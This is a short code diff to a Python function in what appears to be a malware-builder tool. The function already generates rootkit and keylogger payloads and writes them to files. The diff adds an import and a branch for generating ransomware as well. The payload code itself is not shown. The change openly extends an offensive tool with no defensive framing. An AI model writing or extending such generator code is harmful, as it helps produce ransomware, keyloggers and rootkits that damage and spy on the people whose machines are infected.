@@ -159,13 +159,17 @@ def create_file(file: str):
 
 
 def generate(payload_type):
+    "generates payloads with given payload_type"
     from core.helper_core.rootkit import get_rootkit
     from core.helper_core.keylogger import get_keylogger
-    "generates payloads with given payload_type"
+    from core.helper_core.ransomware import get_ransomware
     if payload_type == "rootkit":
         payload, path = get_rootkit()
     elif payload_type == "keylogger":
         payload, path = get_keylogger()
+    elif payload_type == "ransomware":
+        payload, path = get_ransomware()
+
     notify("notify", "Opening File To Write Data On It...", "")
     try:
         file = open(path, "w+")
